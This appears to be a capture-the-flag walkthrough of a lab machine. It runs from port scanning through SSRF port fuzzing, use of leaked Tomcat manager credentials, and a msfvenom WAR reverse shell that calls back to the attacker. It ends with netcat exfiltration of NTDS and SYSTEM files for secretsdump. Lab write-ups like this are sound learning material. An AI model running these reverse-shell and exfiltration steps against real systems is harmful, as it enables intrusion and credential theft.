I start off with an nmap scan:
└─# nmap -sC -sV -A 10.10.10.55
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report

I felt there might be more so I went for a full nmap port scan:
└─# nmap -p- --min-rate 10000 10.10.10.55
PORT      STATE    SERVICE
22/tcp    open     ssh
4300/tcp  filtered corelccam
8009/tcp  open     ajp13
8080/tcp  open     http-proxy
11975/tcp filtered unknown
20326/tcp filtered unknown
35015/tcp filtered unknown
60000/tcp open     unknown
I got interested with what ajp13   Apache Jserv server is and went to search around a bit. And sure enough as I expected I found a close link between
this jserv server and tomcat server. A brief narration as below:
If the AJP port is exposed, Tomcat might be susceptible to the Ghostcat vulnerability. 
Ghostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled. Still, this can include files like
WEB-INF/web.xml which can leak important information like credentials for the Tomcat interface, depending on the server setup

Directory bruteforcing with the hope to find credentials to tomcat:
└─# gobuster dir -u http://10.10.10.55:8080 -w /usr/share/wordlists/directory-list-2.3-medium.txt 
/docs
/examples
/manager
I did not get far with this ghostcat vulnerability and so I check port 60000.
This returns some output http://10.10.10.55:60000/url.php?path=http://127.0.0.1:22
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 Protocol mismatch.
Next thing is to FUZZ for more open ports that could otherwise be accessed locally only.
└─# wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://127.0.0.1:FUZZ
=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================

000000022:   200        4 L      4 W        62 Ch       "22"          
000000090:   200        11 L     18 W       156 Ch      "90"          
000000110:   200        17 L     24 W       187 Ch      "110"         
000000200:   200        3 L      2 W        22 Ch       "200"         
000000320:   200        26 L     109 W      1232 Ch     "320"         
000000888:   200        78 L     265 W      3955 Ch     "888"         
000003306:   200        4 L      9 W        123 Ch      "3306" 

Port 888 has a backup file, I would want to know what is inside : http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888

GET /url.php?path=http://127.0.0.1:888?doc=backup HTTP/1.1
Host: 10.10.10.55:60000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
   <user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
Now with these credentials I can head over to the tomcat page and login.http://10.10.10.55:8080/manager/html
Next I need to generate a war file reverse shell:
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=1234 -f war > shell.war
And then deploy and run : http://10.10.10.55:8080/shell/
And on my netcat listener I get a shell as tomcat:
Ncat: Connection from 10.10.10.55:56108.
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls
ls
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
I send these files over to my local box:
Receiver
└─# nc -lvnp 4444 > test.dit
└─# nc -lvnp 4444 > test.bin
Sender
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.18 4444 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.18 4444 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
└─# python /opt/impacket/examples/secretsdump.py -ntds test.dit -system test.bin

Impacket issue : http://5.9.10.113/66087250/fix-for-kali-impacket-issues-between-python-2-and-3-2020-4

A good reference here:
https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74
